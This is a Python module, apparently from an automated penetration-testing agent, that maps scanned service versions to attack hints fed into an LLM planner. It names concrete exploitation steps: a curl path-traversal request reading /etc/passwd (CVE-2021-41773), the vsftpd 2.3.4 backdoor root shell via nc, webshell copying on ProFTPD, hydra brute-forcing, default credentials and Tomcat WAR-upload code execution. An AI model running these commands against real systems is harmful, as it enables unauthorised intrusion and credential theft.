"""Engagement playbook — deterministic service→attack knowledge base.

A weak local LLM free-styling commands hallucinates flags, scripts and paths.
This module grounds it: given the structured intel we extracted (services,
versions, web stack), produce concrete, proven next-step hints that are
injected into the planner prompt. Every hint names real tools from the
allowlist and real on-disk wordlists.
"""

from __future__ import annotations

import re
from pathlib import Path

# (matcher on lowercased service/version string, hint)
SERVICE_HINTS: list[tuple[str, str]] = [
    (r"apache.*2\.4\.49",
     "Apache 2.4.49 → CVE-2021-41773 path traversal/RCE: "
     "curl --path-as-is 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'"),
    (r"apache.*2\.4\.50",
     "Apache 2.4.50 → CVE-2021-42013 (incomplete 41773 fix) — same curl "
     "path-traversal technique with .%%32%65 encoding"),
    (r"vsftpd 2\.3\.4",
     "vsftpd 2.3.4 → backdoor RCE: connect ftp with user ending in ':)' then "
     "nc TARGET 6200 for a root shell"),
    (r"proftpd 1\.3\.5",
     "ProFTPD 1.3.5 → mod_copy RCE: SITE CPFR/CPTO to copy a webshell into "
     "the webroot"),
    (r"samba|smbd|netbios|microsoft-ds|445/tcp",
     "SMB → enum4linux-ng -A TARGET; smbclient -L //TARGET -N (null session); "
     "check shares anonymously"),
    (r"^ftp|ftp ",
     "FTP → check anonymous login (nmap --script=ftp-anon or ftp anonymous:"
     "anonymous); look for writable dirs and cred files"),
    (r"openssh ([0-6]\.|7\.[0-6][^0-9])",
     "OpenSSH ≤7.6 → username enumeration CVE-2018-15473; then hydra ssh "
     "with any discovered usernames"),
    (r"openssh",
     "SSH → password attack only with a real user list: hydra -L users.txt "
     "-P WORDLIST ssh://TARGET"),
    (r"mysql|mariadb",
     "MySQL → try default/empty root creds; hydra mysql; check for "
     "remote root login"),
    (r"wordpress",
     "WordPress → wpscan --url http://TARGET -e ap,u (plugins + users); "
     "brute wp-login with found users"),
    (r"phpmyadmin",
     "phpMyAdmin → default creds root:root / root:blank; check "
     "/phpmyadmin/ directly"),
    (r"tomcat|jenkins",
     "Tomcat/Jenkins → manager app default creds (tomcat:s3cret, admin:admin); "
     "WAR upload for RCE"),
]

WEB_PORTS = {"80", "443", "8080", "8000", "8443", "8888", "3000", "5000"}

# canonical wordlists to offer the planner (first existing wins at runtime)
WORDLIST_CANDIDATES = {
    "web-dirs": [
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
    ],
    "passwords": [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/best1050.txt",
    ],
    "usernames": [
        "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
        "/usr/share/seclists/Usernames/Names/names.txt",
    ],
}


def available_wordlists() -> dict[str, str]:
    """kind -> first wordlist path that actually exists on this machine."""
    out: dict[str, str] = {}
    for kind, cands in WORDLIST_CANDIDATES.items():
        for c in cands:
            if Path(c).exists():
                out[kind] = c
                break
    return out


def hints_for(intel_items: list[dict]) -> list[str]:
    """Concrete attack hints derived from extracted intel."""
    hints: list[str] = []
    services = [i for i in intel_items if i["kind"] == "service"]
    for svc in services:
        text = svc["value"].lower()
        for pattern, hint in SERVICE_HINTS:
            if re.search(pattern, text):
                hints.append(hint)  # caller replaces TARGET with the host
    # generic web enumeration chain for any HTTP-looking service
    web_ports = {s["key"].split("/")[0] for s in services
                 if re.search(r"http|ssl|www", s["value"].lower())}
    web_ports |= {s["key"].split("/")[0] for s in services
                  if s["key"].split("/")[0] in WEB_PORTS}
    if web_ports:
        wl = available_wordlists().get("web-dirs")
        chain = (f"HTTP on port(s) {sorted(web_ports)} → web enum chain: "
                 "whatweb http://TARGET, check /robots.txt /.git/ /sitemap.xml, "
                 "nikto -h http://TARGET")
        if wl:
            chain += (f", directory brute: gobuster dir -u http://TARGET -w {wl}"
                      f"  (this wordlist exists on disk)")
        hints.append(chain)
    # de-duplicate, keep order
    seen, out = set(), []
    for h in hints:
        if h not in seen:
            seen.add(h)
            out.append(h)
    return out[:12]
